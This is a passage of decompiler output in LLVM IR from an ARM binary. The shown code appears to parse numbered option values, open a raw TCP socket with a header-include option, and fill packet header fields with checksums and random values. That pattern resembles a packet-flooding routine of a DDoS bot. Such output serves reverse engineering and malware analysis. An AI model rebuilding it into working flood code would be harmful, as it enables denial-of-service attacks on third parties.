  %v1_b25c = phi i32 [ %v1_b3a8, %dec_label_pc_b388 ], [ %v1_b250, %dec_label_pc_b24c ]
  store i32 %v3_afdc, i32* %r1.global-to-local, align 4
  %v9_b25c = icmp eq i32 %v3_afdc, %v1_b25c
  store i1 %v9_b25c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b25c, label %dec_label_pc_b3c4, label %dec_label_pc_b264

dec_label_pc_b264:                                ; preds = %dec_label_pc_b3b0, %dec_label_pc_b258
  store i32 %v1_afe0, i32* %r2.global-to-local, align 4
  store i1 %v2_b3cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b3cc, label %dec_label_pc_b3e0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_b264
  %v1_b26c = load i32, i32* @r5, align 4
  %v2_b26c = add i32 %v1_b26c, 16
  %v3_b26c = inttoptr i32 %v2_b26c to i32*
  %v4_b26c = load i32, i32* %v3_b26c, align 4
  store i32 %v4_b26c, i32* %r3.global-to-local, align 4
  %v2_b270 = load i32, i32* @r6, align 4
  %v3_b270 = add i32 %v2_b270, 16
  %v4_b270 = inttoptr i32 %v3_b270 to i32*
  store i32 %v4_b26c, i32* %v4_b270, align 4
  br label %dec_label_pc_b278

dec_label_pc_b278:                                ; preds = %bb52, %.thread4
  store i32 %v1_af48, i32* %r3.global-to-local, align 4
  store i1 %v2_b3e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b3e8, label %dec_label_pc_b284, label %dec_label_pc_b3f4

dec_label_pc_b284:                                ; preds = %dec_label_pc_b278, %dec_label_pc_b3e0, %dec_label_pc_b3f4
  %v2_b288 = load i32, i32* @r5, align 4
  %v3_b288 = add i32 %v2_b288, 10
  %v4_b288 = inttoptr i32 %v3_b288 to i16*
  store i16 0, i16* %v4_b288, align 2
  %v0_b28c = load i32, i32* @r5, align 4
  store i32 %v0_b28c, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_b294 = call i32 @function_dadc(i32 %v0_b28c, i32 20)
  %v3_b294 = trunc i32 %v2_b294 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b29c = load i32, i32* @r5, align 4
  %v4_b29c = add i32 %v3_b29c, 10
  %v5_b29c = inttoptr i32 %v4_b29c to i16*
  store i16 %v3_b294, i16* %v5_b29c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b2a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2a4 = trunc i32 %v0_b2a4 to i16
  %v2_b2a4 = load i32, i32* @r6, align 4
  %v3_b2a4 = add i32 %v2_b2a4, 10
  %v4_b2a4 = inttoptr i32 %v3_b2a4 to i16*
  store i16 %v1_b2a4, i16* %v4_b2a4, align 2
  %v0_b2a8 = load i32, i32* @r6, align 4
  store i32 %v0_b2a8, i32* @r0, align 4
  %v2_b2ac = call i32 @function_dadc(i32 %v0_b2a8, i32 20)
  %v3_b2ac = trunc i32 %v2_b2ac to i16
  %v3_b2b0 = load i32, i32* @r6, align 4
  %v4_b2b0 = add i32 %v3_b2b0, 10
  %v5_b2b0 = inttoptr i32 %v4_b2b0 to i16*
  store i16 %v3_b2ac, i16* %v5_b2b0, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b2b8 = load i32, i32* @r7, align 4
  %v3_b2b8 = add i32 %v2_b2b8, 6
  %v4_b2b8 = inttoptr i32 %v3_b2b8 to i16*
  store i16 0, i16* %v4_b2b8, align 2
  %v0_b2bc = load i32, i32* @r7, align 4
  store i32 %v0_b2bc, i32* @r1, align 4
  %v1_b2c0 = add i32 %v0_b2bc, 4
  %v2_b2c0 = inttoptr i32 %v1_b2c0 to i16*
  %v3_b2c0 = load i16, i16* %v2_b2c0, align 2
  %v4_b2c0 = zext i16 %v3_b2c0 to i32
  store i32 %v4_b2c0, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-108.0.ph, i32* %r3.global-to-local, align 4
  %v0_b2c8 = load i32, i32* @r6, align 4
  %v4_b2cc = call i32 @function_db2c(i32 %v0_b2c8, i32 %v0_b2bc, i32 %v4_b2c0, i32 %stack_var_-108.0.ph)
  %v5_b2cc = trunc i32 %v4_b2cc to i16
  %v3_b2d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2d0, i32* %r2.global-to-local, align 4
  %v3_b2d4 = mul i32 %v3_b2d0, 32
  store i32 %v3_b2d4, i32* %r3.global-to-local, align 4
  %v0_b2d8 = load i32, i32* @r5, align 4
  %v1_b2d8 = add i32 %v0_b2d8, 16
  %v2_b2d8 = inttoptr i32 %v1_b2d8 to i32*
  %v3_b2d8 = load i32, i32* %v2_b2d8, align 4
  %v5_b2dc = mul i32 %v3_b2d0, 24
  store i32 %v5_b2dc, i32* %r3.global-to-local, align 4
  %v1_b2e0 = load i32, i32* @sl, align 4
  %v2_b2e0 = add i32 %v1_b2e0, %v5_b2dc
  store i32 %v2_b2e0, i32* @lr, align 4
  %v2_b2e4 = add i32 %v2_b2e0, 4
  %v3_b2e4 = inttoptr i32 %v2_b2e4 to i32*
  store i32 %v3_b2d8, i32* %v3_b2e4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_b2f0 = load i32, i32* @r7, align 4
  %v4_b2f0 = add i32 %v3_b2f0, 6
  %v5_b2f0 = inttoptr i32 %v4_b2f0 to i16*
  store i16 %v5_b2cc, i16* %v5_b2f0, align 2
  %v0_b2f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v0_b2f8 to i16
  %v2_b2f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_b2f8 = load i32, i32* @sl, align 4
  %v4_b2f8 = add i32 %v3_b2f8, %v2_b2f8
  %v5_b2f8 = inttoptr i32 %v4_b2f8 to i16*
  store i16 %v1_b2f8, i16* %v5_b2f8, align 2
  %v0_b2fc = load i32, i32* %r2.global-to-local, align 4
  %v1_b2fc = trunc i32 %v0_b2fc to i16
  %v2_b2fc = load i32, i32* @lr, align 4
  %v3_b2fc = add i32 %v2_b2fc, 2
  %v4_b2fc = inttoptr i32 %v3_b2fc to i16*
  store i16 %v1_b2fc, i16* %v4_b2fc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b304 = load i32, i32* @r5, align 4
  store i32 %v0_b304, i32* @r1, align 4
  store i32 %v3_af90, i32* @r0, align 4
  %v0_b30c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_b30c, i32* @r2, align 4
  %v0_b318 = call i32 @function_14a98()
  %v3_b31c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b31c, i32* %r3.global-to-local, align 4
  %v1_b320 = add i32 %v3_b31c, 1
  %v1_b324 = load i32, i32* @r8, align 4
  %v9_b324 = icmp eq i32 %v1_b320, %v1_b324
  store i1 %v9_b324, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b320, i32* %stack_var_-44, align 4
  %v6_b32c = icmp slt i32 %v1_b320, %v1_b324
  br i1 %v6_b32c, label %dec_label_pc_b208, label %dec_label_pc_b1f4

dec_label_pc_b334:                                ; preds = %dec_label_pc_b208
  %v1_b334 = add i32 %v2_b210, 16
  %v2_b334 = inttoptr i32 %v1_b334 to i32*
  %v3_b334 = load i32, i32* %v2_b334, align 4
  %v1_b338 = call i32 @function_149d0(i32 %v3_b334)
  store i32 %v1_b338, i32* %r4.global-to-local, align 4
  %v0_b340 = call i32 @function_f570()
  %v3_b344 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b344, i32* %r2.global-to-local, align 4
  %v5_b34c = mul i32 %v3_b344, 24
  %v1_b350 = load i32, i32* @sl, align 4
  %v2_b350 = add i32 %v1_b350, %v5_b34c
  store i32 %v2_b350, i32* %r3.global-to-local, align 4
  %v1_b354 = add i32 %v2_b350, 20
  %v2_b354 = inttoptr i32 %v1_b354 to i8*
  %v3_b354 = load i8, i8* %v2_b354, align 1
  %v4_b354 = zext i8 %v3_b354 to i32
  store i32 %v4_b354, i32* %r2.global-to-local, align 4
  %v0_b358 = load i32, i32* %r4.global-to-local, align 4
  %v7_b358 = lshr i32 %v0_b340, %v4_b354
  %v8_b358 = add i32 %v7_b358, %v0_b358
  %v1_b35c = call i32 @function_14828(i32 %v8_b358)
  store i32 %v5_af7c, i32* %r2.global-to-local, align 4
  store i1 %v8_b364, i1* %cpsr_z.global-to-local, align 1
  %v1_b368 = load i32, i32* @r5, align 4
  %v2_b368 = add i32 %v1_b368, 16
  %v3_b368 = inttoptr i32 %v2_b368 to i32*
  store i32 %v1_b35c, i32* %v3_b368, align 4
  br i1 %v3_b364, label %dec_label_pc_b370, label %dec_label_pc_b23c

dec_label_pc_b370:                                ; preds = %dec_label_pc_b334, %dec_label_pc_b230
  %v0_b370 = call i32 @function_f570()
  store i32 65535, i32* @r4, align 4
  %v0_b37c = load i32, i32* @sb, align 4
  %v9_b37c = icmp eq i32 %v0_b37c, 65535
  store i1 %v9_b37c, i1* %cpsr_z.global-to-local, align 1
  %v1_b380 = load i32, i32* @r5, align 4
  %v2_b380 = add i32 %v1_b380, 12
  %v3_b380 = inttoptr i32 %v2_b380 to i32*
  store i32 %v0_b370, i32* %v3_b380, align 4
  br i1 %v9_b37c, label %dec_label_pc_b388, label %dec_label_pc_b370.dec_label_pc_b24c_crit_edge

dec_label_pc_b370.dec_label_pc_b24c_crit_edge:    ; preds = %dec_label_pc_b370
  %v1_b250.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b24c

dec_label_pc_b388:                                ; preds = %dec_label_pc_b370, %dec_label_pc_b23c
  %v0_b388 = call i32 @function_f570()
  %v3_b390 = urem i32 %v0_b388, 65536
  %v1_b398 = sub nsw i32 999, %v3_b390
  store i32 %v1_b398, i32* %r3.global-to-local, align 4
  %v1_b39c = trunc i32 %v0_b388 to i16
  %v2_b39c = load i32, i32* @r5, align 4
  %v3_b39c = add i32 %v2_b39c, 4
  %v4_b39c = inttoptr i32 %v3_b39c to i16*
  store i16 %v1_b39c, i16* %v4_b39c, align 2
  %v0_b3a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3a0 = trunc i32 %v0_b3a0 to i16
  %v2_b3a0 = load i32, i32* @r6, align 4
  %v3_b3a0 = add i32 %v2_b3a0, 4
  %v4_b3a0 = inttoptr i32 %v3_b3a0 to i16*
  store i16 %v1_b3a0, i16* %v4_b3a0, align 2
  store i32 %v3_afd8, i32* %r3.global-to-local, align 4
  %v1_b3a8 = load i32, i32* @r4, align 4
  %v9_b3a8 = icmp eq i32 %v3_afd8, %v1_b3a8
  store i1 %v9_b3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b3a8, label %dec_label_pc_b3b0, label %dec_label_pc_b258

dec_label_pc_b3b0:                                ; preds = %dec_label_pc_b388, %dec_label_pc_b24c
  %v0_b3b0 = call i32 @function_f570()
  %v1_b3b0 = trunc i32 %v0_b3b0 to i16
  store i32 %v3_afdc, i32* %r1.global-to-local, align 4
  %v1_b3b8 = load i32, i32* @r4, align 4
  %v9_b3b8 = icmp eq i32 %v3_afdc, %v1_b3b8
  store i1 %v9_b3b8, i1* %cpsr_z.global-to-local, align 1
  %v3_b3bc = load i32, i32* @r5, align 4
  %v4_b3bc = add i32 %v3_b3bc, 44
  %v5_b3bc = inttoptr i32 %v4_b3bc to i16*
  store i16 %v1_b3b0, i16* %v5_b3bc, align 2
  br i1 %v9_b3b8, label %dec_label_pc_b3c4, label %dec_label_pc_b264

dec_label_pc_b3c4:                                ; preds = %dec_label_pc_b3b0, %dec_label_pc_b258
  %v0_b3c4 = call i32 @function_f570()
  %v1_b3c4 = trunc i32 %v0_b3c4 to i16
  store i32 %v1_afe0, i32* %r2.global-to-local, align 4
  store i1 %v2_b3cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b3cc, label %.thread18, label %bb52

.thread18:                                        ; preds = %dec_label_pc_b3c4
  %v3_b3d419 = load i32, i32* @r7, align 4
  %v4_b3d420 = add i32 %v3_b3d419, 2
  %v5_b3d421 = inttoptr i32 %v4_b3d420 to i16*
  store i16 %v1_b3c4, i16* %v5_b3d421, align 2
  br label %dec_label_pc_b3e0

bb52:                                             ; preds = %dec_label_pc_b3c4
  %v1_b3d0 = load i32, i32* @r5, align 4
  %v2_b3d0 = add i32 %v1_b3d0, 16
  %v3_b3d0 = inttoptr i32 %v2_b3d0 to i32*
  %v4_b3d0 = load i32, i32* %v3_b3d0, align 4
  store i32 %v4_b3d0, i32* %r3.global-to-local, align 4
  %v3_b3d4 = load i32, i32* @r7, align 4
  %v4_b3d4 = add i32 %v3_b3d4, 2
  %v5_b3d4 = inttoptr i32 %v4_b3d4 to i16*
  store i16 %v1_b3c4, i16* %v5_b3d4, align 2
  %v1_b3d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_b3d8 = load i32, i32* @r6, align 4
  %v3_b3d8 = add i32 %v2_b3d8, 16
  %v4_b3d8 = inttoptr i32 %v3_b3d8 to i32*
  store i32 %v1_b3d8, i32* %v4_b3d8, align 4
  br label %dec_label_pc_b278

dec_label_pc_b3e0:                                ; preds = %.thread18, %dec_label_pc_b264
  %v0_b3e0 = call i32 @function_f570()
  store i32 %v1_af48, i32* %r3.global-to-local, align 4
  store i1 %v2_b3e8, i1* %cpsr_z.global-to-local, align 1
  %v1_b3ec = load i32, i32* @r6, align 4
  %v2_b3ec = add i32 %v1_b3ec, 16
  %v3_b3ec = inttoptr i32 %v2_b3ec to i32*
  store i32 %v0_b3e0, i32* %v3_b3ec, align 4
  br i1 %v2_b3e8, label %dec_label_pc_b284, label %dec_label_pc_b3f4

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b278, %dec_label_pc_b3e0
  %v0_b3f4 = load i32, i32* @r7, align 4
  %v1_b3f4 = add i32 %v0_b3f4, 8
  store i32 %v5_af28, i32* %r1.global-to-local, align 4
  %v2_b3fc = inttoptr i32 %v1_b3f4 to i16*
  %v3_b3fc = call i32 @function_f770(i16* %v2_b3fc, i32 %v5_af28)
  br label %dec_label_pc_b284

dec_label_pc_b404:                                ; preds = %dec_label_pc_afc8
  store i32 %v5_af28, i32* %r3.global-to-local, align 4
  %v1_b40c = add i32 %v5_af28, 8
  store i32 %v1_b40c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b1f4.preheader

; uselistorder directives
  uselistorder i32 %v1_b40c, { 1, 0 }
  uselistorder i16 %v1_b3c4, { 1, 0 }
  uselistorder i32 %v1_b3a8, { 1, 0 }
  uselistorder i32 %v0_b388, { 1, 0 }
  uselistorder i32 %v1_b324, { 1, 2, 0 }
  uselistorder i32 %v1_b320, { 2, 0, 3, 1 }
  uselistorder i32 %v3_b2d0, { 1, 0, 2 }
  uselistorder i32 %v7_b21c, { 1, 0, 2 }
  uselistorder i1 %v2_b3e8, { 2, 3, 1, 0 }
  uselistorder i1 %v2_b3cc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b19c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_b0d0, { 1, 0 }
  uselistorder i32 %v4_b18c, { 1, 0 }
  uselistorder i1 %v2_b190, { 1, 0 }
  uselistorder i32 %v4_b16c, { 1, 0 }
  uselistorder i32 %v3_b020, { 1, 0 }
  uselistorder i32 %v3_b01c, { 1, 0 }
  uselistorder i32 %v3_b008, { 2, 1, 0 }
  uselistorder i32 %v3_afe8, { 1, 0 }
  uselistorder i32 %v1_afe0, { 4, 3, 5, 1, 2, 0 }
  uselistorder i32 %v0_afd0, { 1, 0 }
  uselistorder i1 %v7_afc0, { 1, 0 }
  uselistorder i1 %v7_af94, { 1, 0 }
  uselistorder i32 %v3_af90, { 5, 1, 3, 4, 2, 0, 6 }
  uselistorder i32 %v5_af7c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_af48, { 1, 0, 2 }
  uselistorder i32 %v5_af28, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v1_aedc, { 1, 0, 2 }
  uselistorder i8 %v5_ae94, { 2, 0, 1 }
  uselistorder i32 %v2_ae5c, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 10, 11, 12, 13, 14, 15, 16, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 31, 32, 33, 22, 23, 24, 26, 25, 27, 28, 29, 30, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 22, 23, 24, 15, 16, 17, 18, 19, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 14, 10, 11, 12, 15, 16, 17, 19, 18, 20, 21, 23, 22, 24, 25, 27, 26, 29, 28, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20, 15, 16, 17, 18, 21, 22, 23 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b3f4, { 1, 0 }
  uselistorder label %dec_label_pc_b284, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1f4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_b1d4, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_b0c8, { 1, 0 }
  uselistorder label %dec_label_pc_b040, { 1, 0 }
}

define i32 @function_b420(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b420:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp60 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_b420 = load i32, i32* @r4, align 4
  %v6_b420 = load i32, i32* @r5, align 4
  %v18_b420 = load i32, i32* @sb, align 4
  %v27_b420 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b43c = call i32 @function_1320c(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %v2_b43c, i32* @r8, align 4
  %v0_b448 = load i32, i32* @r6, align 4
  store i32 %v0_b448, i32* %r0.global-to-local, align 4
  %v2_b44c = call i32 @function_1320c(i32 %v0_b448, i32 4)
  %v0_b450 = load i32, i32* @r5, align 4
  store i32 %v0_b450, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b460 = load i32, i32* @r4, align 4
  store i32 %v0_b460, i32* %r0.global-to-local, align 4
  %v5_b464 = inttoptr i32 %v0_b450 to i32*
  %v6_b464 = call i32 @function_a430(i32 %v0_b460, i32* %v5_b464, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r1.global-to-local, align 4
  %v0_b480 = load i32, i32* @r4, align 4
  store i32 %v0_b480, i32* %r0.global-to-local, align 4
  %v6_b488 = inttoptr i32 %v0_b47c to i32*
  %v7_b488 = call i32 @function_a430(i32 %v0_b480, i32* %v6_b488, i32 3, i32 65535)
  %v0_b48c = load i32, i32* @r5, align 4
  store i32 %v0_b48c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b488, i32* @r7, align 4
  %v0_b49c = load i32, i32* @r4, align 4
  store i32 %v0_b49c, i32* %r0.global-to-local, align 4
  %v4_b4a0 = inttoptr i32 %v0_b48c to i32*
  %v5_b4a0 = call i32 @function_a430(i32 %v0_b49c, i32* %v4_b4a0, i32 4, i32 64)
  %v0_b4ac = load i32, i32* @r5, align 4
  store i32 %v0_b4ac, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4b8 = load i32, i32* @r4, align 4
  store i32 %v0_b4b8, i32* %r0.global-to-local, align 4
  %v6_b4c0 = inttoptr i32 %v0_b4ac to i32*
  %v7_b4c0 = call i32 @function_a430(i32 %v0_b4b8, i32* %v6_b4c0, i32 5, i32 1)
  %v1_b4cc = urem i32 %v7_b4c0, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b4d4 = load i32, i32* @r5, align 4
  store i32 %v0_b4d4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b4dc = load i32, i32* @r4, align 4
  store i32 %v0_b4dc, i32* %r0.global-to-local, align 4
  %v5_b4e4 = inttoptr i32 %v0_b4d4 to i32*
  %v6_b4e4 = call i32 @function_a430(i32 %v0_b4dc, i32* %v5_b4e4, i32 7, i32 65535)
  %v3_b4ec = urem i32 %v6_b4e4, 65536
  %v0_b4f0 = load i32, i32* @r5, align 4
  store i32 %v0_b4f0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b4fc = load i32, i32* @r4, align 4
  store i32 %v0_b4fc, i32* %r0.global-to-local, align 4
  %v5_b504 = inttoptr i32 %v0_b4f0 to i32*
  %v6_b504 = call i32 @function_a430(i32 %v0_b4fc, i32* %v5_b504, i32 11, i32 0)
  %v1_b50c = urem i32 %v6_b504, 256
  %v0_b510 = load i32, i32* @r5, align 4
  store i32 %v0_b510, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b51c = load i32, i32* @r4, align 4
  store i32 %v0_b51c, i32* %r0.global-to-local, align 4
  %v5_b524 = inttoptr i32 %v0_b510 to i32*
  %v6_b524 = call i32 @function_a430(i32 %v0_b51c, i32* %v5_b524, i32 12, i32 1)
  %v0_b530 = load i32, i32* @r5, align 4
  store i32 %v0_b530, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b53c = load i32, i32* @r4, align 4
  store i32 %v0_b53c, i32* %r0.global-to-local, align 4
  %v5_b544 = inttoptr i32 %v0_b530 to i32*
  %v6_b544 = call i32 @function_a430(i32 %v0_b53c, i32* %v5_b544, i32 13, i32 1)
  %v1_b54c = urem i32 %v6_b544, 256
  %v0_b550 = load i32, i32* @r5, align 4
  store i32 %v0_b550, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b55c = load i32, i32* @r4, align 4
  store i32 %v0_b55c, i32* %r0.global-to-local, align 4
  %v5_b564 = inttoptr i32 %v0_b550 to i32*
  %v6_b564 = call i32 @function_a430(i32 %v0_b55c, i32* %v5_b564, i32 14, i32 0)
  %v0_b570 = load i32, i32* @r5, align 4
  store i32 %v0_b570, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b57c = load i32, i32* @r4, align 4
  store i32 %v0_b57c, i32* %r0.global-to-local, align 4
  %v5_b584 = inttoptr i32 %v0_b570 to i32*
  %v6_b584 = call i32 @function_a430(i32 %v0_b57c, i32* %v5_b584, i32 15, i32 0)
  %v1_b58c = urem i32 %v6_b584, 256
  %v0_b590 = load i32, i32* @r5, align 4
  store i32 %v0_b590, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b59c = load i32, i32* @r4, align 4
  store i32 %v0_b59c, i32* %r0.global-to-local, align 4
  %v5_b5a4 = inttoptr i32 %v0_b590 to i32*
  %v6_b5a4 = call i32 @function_a430(i32 %v0_b59c, i32* %v5_b5a4, i32 16, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b5b8 = load i32, i32* @r5, align 4
  store i32 %v0_b5b8, i32* %r1.global-to-local, align 4
  %v0_b5bc = load i32, i32* @r4, align 4
  store i32 %v0_b5bc, i32* %r0.global-to-local, align 4
  %v5_b5c4 = inttoptr i32 %v0_b5b8 to i32*
  %v6_b5c4 = call i32 @function_a430(i32 %v0_b5bc, i32* %v5_b5c4, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b5d4 = load i32, i32* @r5, align 4
  store i32 %v0_b5d4, i32* %r1.global-to-local, align 4
  %v0_b5d8 = load i32, i32* @r4, align 4
  store i32 %v0_b5d8, i32* %r0.global-to-local, align 4
  %v4_b5dc = inttoptr i32 %v0_b5d4 to i32*
  %v5_b5dc = call i32 @function_a430(i32 %v0_b5d8, i32* %v4_b5dc, i32 1, i32 1)
  %v1_b5e4 = urem i32 %v5_b5dc, 256
  store i32 %v1_b5e4, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b5f8 = call i32 @function_14b54(i32 2, i32 3, i32 6)
  store i32 %v3_b5f8, i32* @r0, align 4
  %v7_b5fc = icmp eq i32 %v3_b5f8, -1
  store i1 %v7_b5fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b5f8, i32* @fp, align 4
  br i1 %v7_b5fc, label %dec_label_pc_b7f4, label %dec_label_pc_b608

dec_label_pc_b608:                                ; preds = %dec_label_pc_b420
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b610 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b610, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_b624 = call i32 @function_14ae4(i32 %v3_b5f8, i32 0, i32 3, i32 %v6_b610, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b624, i32* %r0.global-to-local, align 4
  %v7_b628 = icmp eq i32 %v5_b624, -1
  store i1 %v7_b628, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b628, label %dec_label_pc_b7ec, label %dec_label_pc_b630

dec_label_pc_b630:                                ; preds = %dec_label_pc_b608
  %v0_b630 = load i32, i32* @r7, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b638 = urem i32 %v0_b630, 65536
  store i32 %v3_b638, i32* %r2.global-to-local, align 4
  %v0_b63c = load i32, i32* @r6, align 4
  %v2_b63c = icmp eq i32 %v0_b63c, 0
  store i1 %v2_b63c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b63c, label %dec_label_pc_ba4c, label %dec_label_pc_b64c

dec_label_pc_b64c:                                ; preds = %dec_label_pc_b630
  %v2_b64c = ptrtoint i32* %stack_var_-336 to i32
  store i32 %v2_b64c, i32* @sb, align 4
  %v2_b694 = ptrtoint i32* %stack_var_-152 to i32
  %v3_b83c = icmp eq i32 %v3_b4ec, 65535
  %v2_b6e0 = ptrtoint i32* %stack_var_-64 to i32
  %v4_b788 = zext i8 %tmp to i32
  %v1_b78c = and i32 %v4_b788, 18
  %v2_b790 = icmp eq i32 %v1_b78c, 18
  %sext = mul i32 %v6_b464, 16777216
  %v4_b8ec = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v5_b4a0, 16777216
  %v4_b910 = sdiv i32 %sext8, 16777216
  %v2_b914 = icmp eq i32 %v1_b4cc, 0
  %v3_b774 = sext i16 %tmp60 to i32
  %v1_b798 = and i32 %v4_b788, 5
  %v2_b798 = icmp eq i32 %v1_b798, 0
  %v1_b8a4 = add i32 %v6_b5c4, 40
  %v1_b8f4 = trunc i32 %v4_b8ec to i8
  %v1_b9b0 = urem i32 %v6_b504, 2
  %tmp87 = sub nsw i32 0, %v1_b9b0
  %v4_b9b8 = and i32 %tmp87, 32
  %v1_b9c8 = urem i32 %v6_b524, 2
  %tmp88 = sub nsw i32 0, %v1_b9c8
  %v4_b9d0 = and i32 %tmp88, 16
  %v1_b9e0 = urem i32 %v6_b544, 2
  %tmp89 = sub nsw i32 0, %v1_b9e0
  %v4_b9e8 = and i32 %tmp89, 8
  %v1_b9f8 = urem i32 %v6_b564, 2
